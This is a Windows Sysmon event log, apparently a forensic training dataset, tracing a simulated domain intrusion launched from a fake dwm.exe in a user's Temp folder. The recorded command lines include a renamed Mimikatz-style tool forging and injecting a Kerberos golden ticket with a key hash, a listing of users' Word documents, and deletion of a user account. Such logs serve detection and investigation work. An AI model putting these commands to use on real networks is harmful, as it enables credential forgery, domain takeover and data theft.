レベル,日付と時刻,ソース,イベント ID,タスクのカテゴリ
情報,2019/11/07 15:40:21,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:40:21.098
ProcessGuid: {CC41BF7E-5555-5A01-0000-0010C2982700}
ProcessId: 2868
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:40:21,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:40:21.098
ProcessGuid: {CC41BF7E-5555-5A01-0000-0010349B2700}
ProcessId: 4700
Image: C:\Windows\SysWOW64\net.exe"
情報,2019/11/07 15:40:21,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:40:21.082
ProcessGuid: {CC41BF7E-5555-5A01-0000-00103C9C2700}
ProcessId: 5088
Image: C:\Windows\SysWOW64\net1.exe"
情報,2019/11/07 15:40:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:40:21.076
ProcessGuid: {CC41BF7E-5555-5A01-0000-00103C9C2700}
ProcessId: 5088
Image: C:\Windows\SysWOW64\net1.exe
CommandLine: C:\Windows\system32\net1  user machida.kanagawa /delete
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=382169595D5BBEB535C4575B3EC8CC7E5E933115
ParentProcessGuid: {CC41BF7E-5555-5A01-0000-0010349B2700}
ParentProcessId: 4700
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net  user machida.kanagawa /delete"
情報,2019/11/07 15:40:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:40:21.064
ProcessGuid: {CC41BF7E-5555-5A01-0000-0010349B2700}
ProcessId: 4700
Image: C:\Windows\SysWOW64\net.exe
CommandLine: net  user machida.kanagawa /delete
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=B160F4462A4728BEC8FA053B99709622A4B4DD20
ParentProcessGuid: {CC41BF7E-5555-5A01-0000-0010C2982700}
ParentProcessId: 2868
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net user machida.kanagawa /delete"""
情報,2019/11/07 15:40:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:40:21.015
ProcessGuid: {CC41BF7E-5555-5A01-0000-001033992700}
ProcessId: 4236
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-5555-5A01-0000-0010C2982700}
ParentProcessId: 2868
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net user machida.kanagawa /delete"""
情報,2019/11/07 15:40:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:40:21.010
ProcessGuid: {CC41BF7E-5555-5A01-0000-0010C2982700}
ProcessId: 2868
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""net user machida.kanagawa /delete""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:40:18,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:40:18.320
ProcessGuid: {CC41BF7E-5540-5A01-0000-0010A4502700}
ProcessId: 4768
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:40:18,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:40:18.273
ProcessGuid: {CC41BF7E-5547-5A01-0000-0010FA5B2700}
ProcessId: 4076
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:40:09,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:40:09.302
ProcessGuid: {CC41BF7E-553D-5A01-0000-001045482700}
ProcessId: 5444
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:40:09,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:40:09.302
ProcessGuid: {CC41BF7E-553D-5A01-0000-0010D4472700}
ProcessId: 1240
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:40:07,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:40:07.427
ProcessGuid: {CC41BF7E-5547-5A01-0000-0010FA5B2700}
ProcessId: 4076
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:4768 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-5540-5A01-0000-0010A4502700}
ParentProcessId: 4768
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:40:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:40:00.875
ProcessGuid: {CC41BF7E-5540-5A01-0000-0010A4502700}
ProcessId: 4768
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:39:57,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:39:57.012
ProcessGuid: {CC41BF7E-553D-5A01-0000-001045482700}
ProcessId: 5444
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-553D-5A01-0000-0010D4472700}
ParentProcessId: 1240
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""dir C:\Users\*.doc* /s /o-d > C:\Intel\Logs\r.txt"""
情報,2019/11/07 15:39:57,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:39:57.006
ProcessGuid: {CC41BF7E-553D-5A01-0000-0010D4472700}
ProcessId: 1240
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""dir C:\Users\*.doc* /s /o-d > C:\Intel\Logs\r.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:39:27,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:39:27.083
ProcessGuid: {CC41BF7E-551F-5A01-0000-0010032E2700}
ProcessId: 804
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:39:27,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:39:27.083
ProcessGuid: {CC41BF7E-551F-5A01-0000-0010922D2700}
ProcessId: 3992
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:39:27,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:39:27.083
ProcessGuid: {CC41BF7E-551F-5A01-0000-001001302700}
ProcessId: 5524
Image: C:\Intel\Logs\mz.exe"
情報,2019/11/07 15:39:27,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:39:27.063
ProcessGuid: {CC41BF7E-551F-5A01-0000-001001302700}
ProcessId: 5524
Image: C:\Intel\Logs\mz.exe
CommandLine: C:\Intel\Logs\mz.exe  ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=53796614833D7596FF9F6BFD59E55D668089A00F
ParentProcessGuid: {CC41BF7E-551F-5A01-0000-0010922D2700}
ParentProcessId: 3992
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit"""
情報,2019/11/07 15:39:27,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:39:27.016
ProcessGuid: {CC41BF7E-551F-5A01-0000-0010032E2700}
ProcessId: 804
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-551F-5A01-0000-0010922D2700}
ParentProcessId: 3992
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit"""
情報,2019/11/07 15:39:27,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:39:27.010
ProcessGuid: {CC41BF7E-551F-5A01-0000-0010922D2700}
ProcessId: 3992
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:39:03,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:39:03.423
ProcessGuid: {CC41BF7E-5507-5A01-0000-001039292700}
ProcessId: 5500
Image: C:\Windows\System32\klist.exe"
情報,2019/11/07 15:39:03,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:39:03.416
ProcessGuid: {CC41BF7E-5507-5A01-0000-001039292700}
ProcessId: 5500
Image: C:\Windows\System32\klist.exe
CommandLine: klist  purge
CurrentDirectory: C:\Users\maebashi.gunma\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=0212B9B929CD5224B181081EEFAEAC5BE04038C4
ParentProcessGuid: {CC41BF7E-4E61-5A01-0000-0010F1A41400}
ParentProcessId: 1492
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\system32\cmd.exe"" "
情報,2019/11/07 15:39:00,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:39:00.083
ProcessGuid: {CC41BF7E-5504-5A01-0000-001086252700}
ProcessId: 672
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:39:00,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:39:00.083
ProcessGuid: {CC41BF7E-5504-5A01-0000-00100E252700}
ProcessId: 1164
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:39:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:39:00.059
ProcessGuid: {CC41BF7E-5504-5A01-0000-001086252700}
ProcessId: 672
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-5504-5A01-0000-00100E252700}
ParentProcessId: 1164
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""klist purge"""
情報,2019/11/07 15:39:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:39:00.043
ProcessGuid: {CC41BF7E-5504-5A01-0000-00100E252700}
ProcessId: 1164
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""klist purge""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:38:34,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:38:34.046
ProcessGuid: {CC41BF7E-54DE-5A01-0000-0010FEA02600}
ProcessId: 4576
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:38:33,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:38:33.984
ProcessGuid: {CC41BF7E-54DE-5A01-0000-00106CAB2600}
ProcessId: 4264
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:38:33,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:38:33.953
ProcessGuid: {CC41BF7E-54DF-5A01-0000-001029CF2600}
ProcessId: 1936
Image: C:\Windows\System32\Macromed\Flash\FlashUtil_ActiveX.exe"
情報,2019/11/07 15:38:27,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:38:27.046
ProcessGuid: {CC41BF7E-54E2-5A01-0000-0010C80B2700}
ProcessId: 6096
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:38:27,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:38:27.046
ProcessGuid: {CC41BF7E-54E2-5A01-0000-00104E0B2700}
ProcessId: 3588
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:38:27,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:38:27.046
ProcessGuid: {CC41BF7E-54E2-5A01-0000-0010990D2700}
ProcessId: 768
Image: C:\Intel\Logs\mz.exe"
情報,2019/11/07 15:38:26,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:38:26.996
ProcessGuid: {CC41BF7E-54E2-5A01-0000-0010990D2700}
ProcessId: 768
Image: C:\Intel\Logs\mz.exe
CommandLine: C:\Intel\Logs\mz.exe  ""kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi"" exit
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=53796614833D7596FF9F6BFD59E55D668089A00F
ParentProcessGuid: {CC41BF7E-54E2-5A01-0000-00104E0B2700}
ParentProcessId: 3588
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi"" exit"""
情報,2019/11/07 15:38:26,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:38:26.951
ProcessGuid: {CC41BF7E-54E2-5A01-0000-0010C80B2700}
ProcessId: 6096
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-54E2-5A01-0000-00104E0B2700}
ParentProcessId: 3588
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi"" exit"""
情報,2019/11/07 15:38:26,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:38:26.944
ProcessGuid: {CC41BF7E-54E2-5A01-0000-00104E0B2700}
ProcessId: 3588
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi"" exit""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:38:23,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:38:23.777
ProcessGuid: {CC41BF7E-54DF-5A01-0000-001029CF2600}
ProcessId: 1936
Image: C:\Windows\System32\Macromed\Flash\FlashUtil_ActiveX.exe
CommandLine: ""C:\Windows\System32\Macromed\Flash\FlashUtil_ActiveX.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=7885A583868EA312E7F141E15B2BC45BF0086DB1
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:38:23,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:38:23.608
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:38:23,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:38:23.608
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:38:23,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:38:23.565
ProcessGuid: {CC41BF7E-54DF-5A01-0000-001003C92600}
ProcessId: 2636
Image: C:\Windows\System32\fontdrvhost.exe
CommandLine: ""fontdrvhost.exe""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: AppContainer
Hashes: SHA1=2CA5499A79C56A6B0F8803B1AFDA136AF69A35FD
ParentProcessGuid: {CC41BF7E-4CCC-5A01-0000-001086700000}
ParentProcessId: 512
ParentImage: C:\Windows\System32\winlogon.exe
ParentCommandLine: winlogon.exe"
情報,2019/11/07 15:38:22,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:38:22.642
ProcessGuid: {CC41BF7E-54DE-5A01-0000-00106CAB2600}
ProcessId: 4264
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:4576 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-54DE-5A01-0000-0010FEA02600}
ParentProcessId: 4576
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:38:22,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:38:22.189
ProcessGuid: {CC41BF7E-54DE-5A01-0000-0010FEA02600}
ProcessId: 4576
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:38:00,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:38:00.012
ProcessGuid: {CC41BF7E-54C7-5A01-0000-001090982600}
ProcessId: 2128
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:38:00,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:38:00.012
ProcessGuid: {CC41BF7E-54C7-5A01-0000-00101F982600}
ProcessId: 5584
Image: C:\Windows\SysWOW64\cmd.exe"
